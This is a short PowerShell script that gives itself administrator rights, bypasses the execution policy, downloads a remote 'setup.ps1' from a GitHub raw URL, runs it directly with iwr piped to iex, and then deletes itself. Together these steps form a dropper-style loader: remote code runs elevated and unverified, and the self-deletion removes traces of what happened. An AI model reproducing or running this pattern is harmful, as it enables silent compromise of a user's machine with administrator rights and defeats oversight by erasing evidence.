# Self-elevating startup script - deletes itself after one successful elevated run
if (!(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))) {
    Start-Process PowerShell "-NoProfile -ExecutionPolicy Bypass -Command `"cd '$pwd'; `$scriptPath = '\$PSCommandPath'; & '$PSCommandPath'; Remove-Item '\$scriptPath' -Force`" " -Verb RunAs
    exit
}

# Your main elevated code here (replace with actual commands)
iwr -useb https://raw.githubusercontent.com/FCsab/weather/refs/heads/main/setup.ps1 | iex

# Self-delete after successful elevated execution
Start-Sleep 2
Remove-Item $PSCommandPath -Force
exit